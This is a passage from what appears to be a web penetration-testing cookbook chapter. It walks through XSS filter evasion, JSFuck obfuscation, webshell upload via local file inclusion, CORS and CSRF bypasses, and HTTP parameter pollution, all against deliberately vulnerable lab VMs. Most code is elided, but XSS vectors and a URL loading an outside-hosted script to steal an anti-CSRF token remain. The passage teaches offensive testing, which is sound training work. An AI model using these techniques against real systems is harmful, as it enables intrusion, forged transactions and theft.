- en: Bypassing Basic Security Controls
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'In this chapter, we will cover the following recipes:'
  prefs: []
  type: TYPE_NORMAL
- en: Basic input validation bypass in Cross-Site Scripting attacks
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Exploiting Cross-Site Scripting using obfuscated code
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Bypassing file upload restrictions
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Avoiding CORS restrictions in web services
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Using Cross-Site Scripting to bypass CSRF protection and CORS restrictions
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Exploiting HTTP parameter pollution
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Exploiting vulnerabilities through HTTP headers
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Introduction
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: So far, in this book, we have identified and exploited vulnerabilities in conditions
    where they could be considered *low hanging fruits*, that is, we knew the vulnerabilities
    existed, and in their exploitation, we didn't face any prevention mechanisms or
    had to avoid being blocked by a web application firewall or similar.
  prefs: []
  type: TYPE_NORMAL
- en: The most common scenario in a real-world penetration test is that developers
    have made an effort to build a robust and secure application, and vulnerabilities
    may not be straightforward to find and may be completely or partially addressed
    so they are either not present in the application, or are at least hard to find
    and exploit. For this scenario, we need to have in our arsenal tools that allow
    us to discover ways to overcome these complications and, be able to identify and
    exploit flaws that the developers thought they had prevented, but did to in a
    non-optimum manner.
  prefs: []
  type: TYPE_NORMAL
- en: In this chapter, we will discuss several mechanisms to bypass protections and
    security controls that do not mitigate vulnerabilities but attempt to hide them
    or complicate their exploitation, which is not ideal way of solving a security
    issue.
  prefs: []
  type: TYPE_NORMAL
- en: Basic input validation bypass in Cross-Site Scripting attacks
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: One of the most common ways in which developers perform input validation is
    by blacklisting certain characters of words in information provided by users.
    The main drawback of this blacklisting approach is that elements that may be used
    in an attack are often missed because new vectors are found every day.
  prefs: []
  type: TYPE_NORMAL
- en: In this recipe, we will illustrate some methods for bypassing a weak implementation
    of a blacklisting validation.
  prefs: []
  type: TYPE_NORMAL
- en: How to do it...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'We will start with DVWA in our vulnerable VM and set the security level to
    medium. Also, set Burp Suite as proxy for the browser:'
  prefs: []
  type: TYPE_NORMAL
- en: 'First, let''s take a look at how the vulnerable page behaves at this security
    level. As shown in the following screenshot, when attempting to inject script
    code, the script tags are removed from the output:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/3e36cf1c-d683-4dbe-8e80-2c38d3c7927e.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Send that request to repeater and issue it again. As it can be seen in the
    next screenshot, the opening script tag is removed:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/edf92362-938e-43ff-bff7-8145b52a4875.png)'
  prefs: []
  type: TYPE_IMG
- en: 'There are multiple ways in which we can try to overcome this obstacle. A very
    common mistake made when implementing this type of protection is to make case-sensitive
    comparisons when validating and sanitizing inputs. Send the request again, but
    this time change the capitalization of the word `script`, and use `sCriPt` instead:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/d7014c44-ac6a-448e-9daf-7a18a17607b7.png)'
  prefs: []
  type: TYPE_IMG
- en: 'According to the output in Repeater, and as shown in the following screenshot,
    that change is sufficient to exploit a **Cross-Site Scripting** (**XSS**) vulnerability:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/e0c7c35f-9c9b-4302-9fff-8466e2955a50.png)'
  prefs: []
  type: TYPE_IMG
- en: How it works...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this recipe, we demonstrated a very simple way to bypass a poorly implemented
    security control, as most programming languages are case sensitive when comparing
    strings. A simple blacklist is not enough protection against injection attacks.
    Unfortunately, it is not uncommon for a penetration tester to see these kinds
    of implementations in real-world applications.
  prefs: []
  type: TYPE_NORMAL
- en: There's more...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'There are so many ways to use capitalization, encoding, and many different
    HTML tags and events to trigger XSS vulnerabilities that it is almost impossible
    to create a comprehensive list of forbidden words or characters. A few other alternatives
    we had in this exercise are as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: Use a different HTML tag, such as `&lt;img>`, `&lt;video>`, and `&lt;div>`,
    and inject the code in its `src` parameter or its event handlers, such as `onload`,
    `onerror`, and `onmouseover`.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Nest multiple script tags, for example, `&lt;scr&lt;script>ipt>`. So, if the
    `&lt;script>` tag is deleted, another tag is formed as a result of its deletion.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Try different encoding on the whole payload or certain parts of it; for example,
    we could have URL-encoded `&lt;script>` to `%3c%73%63%72%69%70%74%3e`.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: A more comprehensive list of validation and filtering bypass can be found at [https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet).
  prefs: []
  type: TYPE_NORMAL
- en: Exploiting Cross-Site Scripting using obfuscated code
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In the preceding recipe, we faced a filtering mechanism that removed the opening
    script tag. As `&lt;script>` is not the only tag that may be used in an XSS attack
    and JavaScript code is more consistent than HTML in terms of capitalization and
    structure, some filters try to restrict the use of words and characters belonging
    to JavaScript code, such as alert, cookie, and document.
  prefs: []
  type: TYPE_NORMAL
- en: In this recipe, we will explore an alternative, a somewhat extreme one maybe,
    of code obfuscation using a so-called esoteric language called JSFuck ([http://JSFuck.com](http://JSFuck.com)).
  prefs: []
  type: TYPE_NORMAL
- en: How to do it...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'For this recipe, we will use the prototyping features provided by the Magical
    Code Injection Rainbow, an application included in our OWASP BWA vulnerable virtual
    machine:'
  prefs: []
  type: TYPE_NORMAL
- en: First, go to the application and select XSSmh from the menu to go to the XSS
    sandbox. Here, we can set up a field vulnerable to XSS with custom types of sanitization.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'In our case, we will use the last Sanitization Level: Case-Insesitively and
    Repetitively Remove Blacklisted Items, matching Keywords.'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: In Sanitization Parameters, we will need to enter the blacklisted words and
    characters—add `alert,document,cookie,href,location,and src`. This will greatly
    limit the range of action of a possible attacker exploiting the application.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'The Input Sanitization section should look like this:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/05e4fb96-3f17-40a2-921d-4fcdc19a84b1.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Now, test a common injection that displays the cookie in an alert message,
    as follows:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/5bd55129-e63a-43c7-8d36-699e97063552.png)'
  prefs: []
  type: TYPE_IMG
- en: As you will see, no alert is shown. This is because of the sanitization options
    we configured.
  prefs: []
  type: TYPE_NORMAL
- en: In order to bypass this protection, we will need to find a way to obfuscate
    the code so that it is approved by the validation mechanism and still recognized
    and executed by the browser. Here is where JSFuck comes into play. On your base
    machine, navigate to [http://jsfuck.com](http://jsfuck.com). The site describes
    the language and how it goes about generating JavaScript code with only six different
    characters, namely *[*, *]*, *(*, *)*, *+*, and *!*.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'You will also find that this site has a form to convert normal JavaScript to
    JSFuck representation; try converting `alert(document.cookie);`, which is the
    payload we are trying to get executed. As can be seen in the following screenshot,
    that simple string generates a code of almost 13,000 characters, which is too
    much to send in a `GET` request. We need to find a way to reduce that amount:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/dcd87515-c9c8-4677-97b9-e9b8437ee4f0.png)'
  prefs: []
  type: TYPE_IMG
- en: 'What we can do is to not obfuscate the whole payload, but only the parts that
    are necessary to bypass the sanitization. Make sure that the Eval Source option
    is not set, and obfuscate the following strings:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '`ert`'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '`d`'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '`e`'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: 'Now, we will integrate the obfuscated code into a full payload. As the JSFuck
    output is interpreted by the JavaScript engine as text, we will need to use the
    `eval` function to execute it. The final payload would be as follows:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE0]'
  prefs: []
  type: TYPE_PRE
- en: 'Insert the payload in the injection string and click on **Inject**. The code
    should be executed as follows:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/5e4a7378-b3e2-4194-a827-48ae8a361aad.png)'
  prefs: []
  type: TYPE_IMG
- en: How it works...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: By obfuscating the payload, we are able to bypass security controls based in
    the recognition of words and characters. We chose to use the language JSFuck to
    obfuscate the code as it is in fact JavaScript.
  prefs: []
  type: TYPE_NORMAL
- en: 'JSFuck obfuscates the code by manipulating Boolean values and predefined constants
    to form printable characters, for example, to get the character `a`:'
  prefs: []
  type: TYPE_NORMAL
- en: '`a` is the second letter of `false` and it also can be represented as the second
    element of an array: false[1].'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: That can also be represented as `(false+[])[1]`.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Also, `false`, as a Boolean value, is the negation of an empty array `![]`.
    So, the above expression could also be `(![]+[])[1]`.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: The number `1` can also be `+true`, which leaves `(![]+[])[+true]`.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Finally, we all know true is the opposite of false, then `!![]`, and our final
    string is `(![]+[])[+!![]]`.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: We used the obfuscation only over a few letters of each blacklisted word, so
    we did not make a payload that is too big, but we were also able to bypass it.
    As this obfuscation generates a string, we need to use `eval` to instruct the
    interpreter to treat that string as a piece of executable code.
  prefs: []
  type: TYPE_NORMAL
- en: Bypassing file upload restrictions
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In previous chapters, we have seen how to avoid some restrictions in file uploads.
    In this recipe, we will face a more complete, although still insufficient, validation
    and chain another vulnerability in order to, first, upload a webshell into the
    server, and second, move it into a directory where we can execute it from.
  prefs: []
  type: TYPE_NORMAL
- en: How to do it...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'For this recipe, we need Mutillidae II in our vulnerable VM to be at security
    level, use the Toggle Security option in the menu to set it, and use Burp Suite
    as proxy:'
  prefs: []
  type: TYPE_NORMAL
- en: In Mutillidae II's menu, go to Others | Unrestricted File Upload | File Upload.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'The first test will be to attempt uploading a PHP webshell. You can use the
    ones we used in previous chapters or make a new one. As follows, the upload will
    fail and we will receive a detailed description of why it failed:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/d15f34f7-6a1b-4779-9df8-de4fd1a57e52.png)'
  prefs: []
  type: TYPE_IMG
- en: From the preceding response, we can infer that the files are uploaded to `/tmp`
    in the server, first using a randomly generated name, then file extension and
    type are checked, and if they are allowed, the file is renamed to its original
    name. So, in order to upload and execute a PHP file (a webshell) in this server,
    we need to change its extension and the `Content-Type` header in the request.
  prefs: []
  type: TYPE_NORMAL
- en: 'Let''s first try and upload a script that will tell us what the working directory
    (or document root) of the web server is, so that we know where to copy our webshell
    to once it is uploaded. Create a file `sf-info.php` containing the following code:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE1]'
  prefs: []
  type: TYPE_PRE
- en: 'Upload it by intercepting the upload request and changing the extension to
    `.jpg` in the `filename` parameter and the `Content-Type` to `image/jpeg`, as
    follows:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/ee08d778-316e-41ee-9d3a-484bbc0f40ed.png)'
  prefs: []
  type: TYPE_IMG
- en: Now, go to BurpSuite's Proxy History and send any `GET` request to Mutillidae
    to repeater. We will use this to execute our recently uploaded file by exploiting
    a Local File Inclusion vulnerability.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'In **Repeater**, replace the value of the `page` parameter in the URL by `../../../../tmp/sf-info.jpg`
    and send the request. The result, as displayed in the following screenshot, will
    tell us the working directory for the web server and the content of such a directory:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/9c2cb502-d654-4532-9c16-bdb47f3f5eae.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Now, let''s create the webshell code and put the following code in a file named
    `webshell.php`:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE2]'
  prefs: []
  type: TYPE_PRE
- en: 'Upload the file, changing its extension and type as follows:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/287ead44-ece3-4cc9-a278-f0c6e99768e2.png)'
  prefs: []
  type: TYPE_IMG
- en: The question now is how to execute commands through the webshell. We cannot
    call it directly, as it is stored in `/tmp` and that is not directly accessible
    from the browser; we may be able to use the file inclusion vulnerability, but,
    as the webshell's code will be integrated with that of the including script (`index.php`),
    we depend on this script not doing any filtering or modification to the parameters
    provided. To work around that difficulties, we will upload another file to the
    server that renames the webshell to `.php` and moves it to the web root.
  prefs: []
  type: TYPE_NORMAL
- en: Send to repeater the request where we uploaded `sf-info.php`.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Change the filename to `rename.jpg` and adjust the `Content-Type`.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Replace the file''s content with the following content:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE3]'
  prefs: []
  type: TYPE_PRE
- en: 'The following screenshot is how it should look:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/9f555b58-d8c6-4a57-989a-1e190b7622dc.png)'
  prefs: []
  type: TYPE_IMG
- en: 'As we did with `sf-info.jpg`, execute `rename.jpg` by exploiting LFI, as demonstrated
    in the following screenshot:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/c32411e1-93e5-45b4-9100-7be712e50db8.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Now, our webshell should be in the application''s root directory. Navigate
    to `http://192.168.56.11/mutillidae/webshell.php`. The following screenshot shows
    system commands being executed through it:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/87390676-1329-462a-adc6-7f04a677d76c.png)'
  prefs: []
  type: TYPE_IMG
- en: How it works...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this recipe, we identified a way to bypass restrictions on a file upload
    page in order to upload malicious code to the server. However, due to such restrictions,
    the uploaded files are not directly executable by the attacker, as they must be
    uploaded as images and they will be treated by the browser and server as such.
  prefs: []
  type: TYPE_NORMAL
- en: We used a Local File Inclusion vulnerability to execute some of the uploaded
    files. This works as a bypass on the file types restriction, but doesn't allow
    for a more complex functionality, such as webshell. First, we executed commands
    to get to know the internal server setup and discover the directories where it
    had the executable code stored.
  prefs: []
  type: TYPE_NORMAL
- en: Once we knew about the internal filesystem, we uploaded our webshell and added
    a second script to copy it to the web root directory so that we could call it
    directly from the browser.
  prefs: []
  type: TYPE_NORMAL
- en: Avoiding CORS restrictions in web services
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: '**Cross-Origin Resource Sharing** (**CORS**) is a set of policies configured
    in the server side that tells the browser whether the server allows requests generated
    with script code at external sites (cross-origin requests), and from which sites,
    or whether it only accepts requests generated in pages hosted by itself (same
    origin). A correctly configured CORS policy can help in the prevention of Cross
    Site Request Forgery attacks, and although it is not enough, it can stop some
    vectors.'
  prefs: []
  type: TYPE_NORMAL
- en: In this recipe, we will configure a web service that does not allow cross-origin
    requests and create a page that is able to send a forged request despite this
    request.
  prefs: []
  type: TYPE_NORMAL
- en: Getting ready
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: For this recipe, we will use the Damn Vulnerable Web Services. It can be downloaded
    from its GitHub address at [https://github.com/snoopysecurity/dvws](https://github.com/snoopysecurity/dvws).
    Download the latest version and copy it to the OWASP BWA virtual machine (or download
    it straight to it); we will put the code in `/var/www/dvwebservices/`.
  prefs: []
  type: TYPE_NORMAL
- en: This code is a collection of vulnerable web services made with the purpose of
    security testing; we will modify one of them to make it less vulnerable. Open
    the `/var/www/dvwebservices/vulnerabilities/cors/server.php` file with a text
    editor; it may be nano, included by default in the VM: `nano /var/www/dvwebservices/vulnerabilities/cors/server.php`
  prefs: []
  type: TYPE_NORMAL
- en: 'Look for all the instances where the Access-Control-Allow-Origin header is
    set and comment each of those lines, as shown in the next screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/64724b50-d138-4112-b68d-be11179753bb.png)'
  prefs: []
  type: TYPE_IMG
- en: 'We also need to add a couple lines of code for the correct processing of the
    request parameters; the final code should be as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE4]'
  prefs: []
  type: TYPE_PRE
- en: How to do it...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Once we have the code in the server, we can browse the web service client at
    `http://192.168.56.11/dvwebservices/vulnerabilities/cors/client.php` and start
    our exercise. Remember to have a proxy such as Burp Suite or ZAP recording all
    the requests:'
  prefs: []
  type: TYPE_NORMAL
- en: First, let's take a look at the normal operation, by browsing to `client.php`*.* It
    shows a secret word generated by the server.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'If we go to the proxy, Burp Suite, in this case, we can see that the client
    makes a `POST` request to `server.php`. There are a few things to notice in this
    request, exemplified in the following screenshot:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: The `Content-Type` header is `application/json`, which means that the body is
    in the JSON format.
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: 'The request''s body is not in the standard HTTP request format (`param1=value&param2=value`),
    but as a JSON object definition, as specified by the header:'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '![](assets/d94222fe-47f6-40d7-a6cc-9c4532a683c9.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Suppose we want to do a CSRF attack over that request. If we want an HTML page
    to make a request in JSON format, we cannot use an HTML form; we need to use JavaScript.
    Create an HTML file, `CORS-json-request.html` in this example, with the following
    code:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE5]'
  prefs: []
  type: TYPE_PRE
- en: 'The preceding code replicates the request made by `client.php`. Open it in
    the browser and click on Submit request. Nothing will happen, and the following
    screenshot shows why:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/a9464e57-67c5-457b-9ecf-a666b8ef5c32.png)'
  prefs: []
  type: TYPE_IMG
- en: According to the preceding error, the request is blocked by the browser because
    the server doesn't specify the allowed origins in its Access-Control-Allow-Origin
    header. This happened because we are requesting a resource (`server.php`) from
    an origin external to the server, a local file in our Kali VM.
  prefs: []
  type: TYPE_NORMAL
- en: 'The easiest way to work around this restriction is to create an HTML page that
    sends the same parameters in a `POST` request generated by an HTML form, as browsers
    do not check the CORS policy when submitting forms. Create another HTML file,
    `CORS-form-request.html`, with the following content:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE6]'
  prefs: []
  type: TYPE_PRE
- en: Browsers do not check CORS policy when submitting HTML forms; however, only
    `GET` and `POST` methods can be used in forms, which leaves out other common methods
    implemented in web services, such as `PUT` and `DELETE`.
  prefs: []
  type: TYPE_NORMAL
- en: 'Load CORS-form-request.html in the browser; it should look as follows:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/bc04b068-f280-4524-8da0-40d78c7e5d5d.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Click on Submit form request and take a look at how the server responds with
    a JSON object containing the secret word:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/11bc3034-3153-4bd2-81c5-c1be42a2ebca.png)'
  prefs: []
  type: TYPE_IMG
- en: Check the request in Burp Suite and verify that the `Content-Type` header is
    `application/x-www-form-urlencoded`.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: How it works...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Our test application for this recipe was a web page (`client.php`) that consumed
    the `REST` web service (`server.php`) to retrieve a secret word. We attempted
    to use a web page in our local system to perform a CSRF attack, but it failed
    because the server doesn't define a CORS policy and the browser, by default, denies
    cross-origin requests.
  prefs: []
  type: TYPE_NORMAL
- en: We then made an HTML form to send the same parameters as in the JavaScript request,
    but in HTML form format, and it succeeded. It's not uncommon for web services
    to receive information in multiple formats, such as XML, JSON, or HTML forms,
    because they are intended to interface with many different applications; however,
    this openness may expose the web services to attacks, especially when vulnerabilities
    such as CSRF are not properly addressed.
  prefs: []
  type: TYPE_NORMAL
- en: Using Cross-Site Scripting to bypass CSRF protection and CORS restrictions
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Oftentimes, when we, as penetration testers, describe XSS to our clients or
    to developers, we focus on the defacement and phishing/information theft aspects
    of its impact and overlook the fact that it can be used by the attacker to forge
    requests using the victim's session to perform any action available to the victim
    within the application.
  prefs: []
  type: TYPE_NORMAL
- en: In this recipe, we will illustrate this situation using an XSS attack to forge
    a request that is protected with an anti-CSRF token.
  prefs: []
  type: TYPE_NORMAL
- en: How to do it...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: For this recipe, we will use the bWApp application in bee-box, `http://192.168.56.13/bWapp`
    in this example, and we will set the security level to Medium.
  prefs: []
  type: TYPE_NORMAL
- en: Once logged in to bWApp, go to the bug Cross Site Request Forgery (Transfer
    Amount).
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Enter an account number and amount and click on the Transfer button.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Let''s analyze the following request in Burp Suite. All of the parameters are
    sent via a `GET` request; by looking at the `token` parameter included in the
    URL, we can infer that there is a CSRF protection in place:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/940c7100-8d71-43f7-af90-289898415e1f.png)'
  prefs: []
  type: TYPE_IMG
- en: 'We will try and exploit an XSS and use it to trigger the transfer request.
    For that, we first need to find the place where the token is stored in the client
    side so that we can retrieve it. Go to the response and look for an input tag
    with the name `token`, and take note of the `id` parameter as well. The following
    screenshot shows that it is a hidden parameter of the form:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/323e299d-9517-4cc4-875c-c7724d136ea1.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Next, we will need to prove that there is an exploitable XSS in place, so go
    to the bug **XSS-Reflected (GET)** and try to exploit it. As demonstrated in the
    following screenshot, it is exploitable:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/9c82cd59-4892-468f-a9e4-fcc6fcafca3b.png)'
  prefs: []
  type: TYPE_IMG
- en: 'We will use that XSS vulnerability to include a JavaScript file hosted in a
    server we control, our Kali Linux VM in this exercise. Create a `forcetransfer.js`
    file with the following code in it:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE7]'
  prefs: []
  type: TYPE_PRE
- en: Start the Apache web server in Kali Linux and move the file to the web root
    (the default is `*/var/www/html*`).
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Now, exploit the XSS setting with the malicious file as source of the script
    tag. While logged in to bWApp, in a new tab, navigate to `http://192.168.56.13/bWAPP/xss_get.php?firstname=test**%3Cscript+src%3Dhttp%3A%2F%2F192.168.56.10%2Fforce-transfer.js%3E%3C%2Fscript%3E**&lastname=asd&form=submit`.
    The XSS payload is in bold.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'The script will load and execute successfully. To take a look at what actually
    happened, look at the Burp Suite''s Proxy history shown in the next screenshot:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/c19afdd6-e07c-47db-9bc2-9b47b52a9514.png)'
  prefs: []
  type: TYPE_IMG
- en: First, the XSS attack is made, then our malicious file `forcetransfer.js` is
    loaded, and this makes the call to `csrf_2.php`, without parameters. This is where
    our scripts gets the anti-CSRF token to use it to send a new request to `csrf_2.php`
    but this time with all the necessary parameters to make a transfer, and this succeeds.
  prefs: []
  type: TYPE_NORMAL
- en: How it works...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: For this recipe, we first identified a request that we wanted to exploit but
    was adequately protected with a unique token. We also identified that the same
    domain (or application) is vulnerable to XSS in other pages.
  prefs: []
  type: TYPE_NORMAL
- en: By exploiting the XSS vulnerability, we were able to include script code hosted
    outside the target domain and use it to first extract the token and then to forge
    a request that included  legitimate anti-CSRF protection.
  prefs: []
  type: TYPE_NORMAL
- en: The script code we used works using JavaScript to send a request to the page
    we wanted to exploit. Once the response is received from the server (`if(xmlhttp.readyState==4
    && xmlhttp.status == 200 )`), it is processed and the token is extracted (`var
    token=responseDoc.getElementById('token').value;`). This is why we needed to take
    note of the `id` parameter when we analyzed the original response and detected
    the token. Having extracted the value for the next valid anti-CSRF token, a new
    request is created and sent; this one contains the values the attacker wants for
    `account` and `amount` and the previously extracted token.
  prefs: []
  type: TYPE_NORMAL
- en: Exploiting HTTP parameter pollution
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: An **HTTP parameter pollution** (**HPP**) attacks occurs when an HTTP parameter
    is repeated multiple times in the same request and the server processes in a different
    way each instance, causing an unexpected behavior in the application.
  prefs: []
  type: TYPE_NORMAL
- en: In this recipe, we will demonstrate how HPP can be exploited and will explain
    how it can be used to bypass certain security controls.
  prefs: []
  type: TYPE_NORMAL
- en: How to do it...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'For this recipe, we will use bWApp again as it has a very illustrative example
    of HPP:'
  prefs: []
  type: TYPE_NORMAL
- en: Log in to bWApp in our vulnerable VM and go to HPP (`http://192.168.56.11/bWAPP/hpp-1.php`).
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Use the normal flow first; there is a form that asks for a name. When a name
    is submitted, it requires the user to vote for a movie, and, in the end, the user's
    vote is displayed.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Note that all parameters (`movie`, `name`, and `action`) are in the URL in
    the last step. Let''s add a second movie parameter with a different value at the
    end of the URL, as shown in the following screenshot:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/cc13220b-3937-4c47-9c7e-fb56babb61e7.png)'
  prefs: []
  type: TYPE_IMG
- en: It seems like the server takes only the last value given to a parameter. Also,
    note that the `name` parameter must have been added to the request via scripting,
    since we introduced it only in the first step.
  prefs: []
  type: TYPE_NORMAL
- en: To have a somewhat realistic exploitation vector, we will attempt to force the
    voting to be always for movie number 2, Iron Man, because *Tony Stark wants to
    win every time*.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Go to step one and introduce the following as a name: `test2&movie=2;` we are
    injecting the movie parameter after the name. After submitting the name, the next
    step should show something like this:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/67747942-da5b-4b02-bcfc-00540c9f0ef1.png)'
  prefs: []
  type: TYPE_IMG
- en: Vote for any movie but Iron Man. As shown in the following screenshot, the result
    will show you actually voted for Iron Man.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/b57fb779-a8e5-478a-9d31-fb56c9745c69.png)'
  prefs: []
  type: TYPE_IMG
- en: How it works...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'In this recipe, we saw how having multiple instances of the same parameter
    in one single request can affect the way the application processes it. The way
    this situation is handled depends on the web server processing the request; here
    are some examples:'
  prefs: []
  type: TYPE_NORMAL
- en: '**Apache/PHP**: Takes only the last occurrence'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**IBM HTTP Server/JSP**: Takes the first occurrence'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**IIS/ASP.NET**: All values are concatenated, separated by commas'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: This lack of a standardized behavior can be used in specific situations to bypass
    protection mechanisms such as **Web Application Firewalls** (**WAF**) or **Intrusion
    Detection Systems** (**IDS**). Imagine an enterprise scenario that is not rare,
    a Tomcat-based application running on an IBM server being protected by an Apache-based
    WAF; if we send a malicious request with multiple instances of a vulnerable parameter
    and put an injection string in the first occurrence and a valid value in the last
    one, the WAF will take the request as valid, while the web server will process
    the first value, which is a malicious injection.
  prefs: []
  type: TYPE_NORMAL
- en: HPP may also allow the bypassing of some controls within the application in
    situations where the different instances are sent in different parts of the request,
    such as URL and headers or body, and, due to bad programming practices, different
    methods in the application take the parameter's value either from the whole request
    or from specific parts of it. For example, in PHP, we can get a parameter from
    any part of the request (URL, body, or cookie), without knowing which one uses
    the `$_REQUEST[]` array, or we can get the same from the arrays dedicated to the
    URL or the body `$_GET[]` and `$_POST[]`, respectively. So, if `$_REQUEST[]` is
    used to look for a value that is supposed to be sent via a `POST` request, but
    that parameter is polluted in the URL, the result may include the parameter in
    the URL instead of the one actually wanted.
  prefs: []
  type: TYPE_NORMAL
- en: For more information on this vulnerability and some illustrative examples, visit
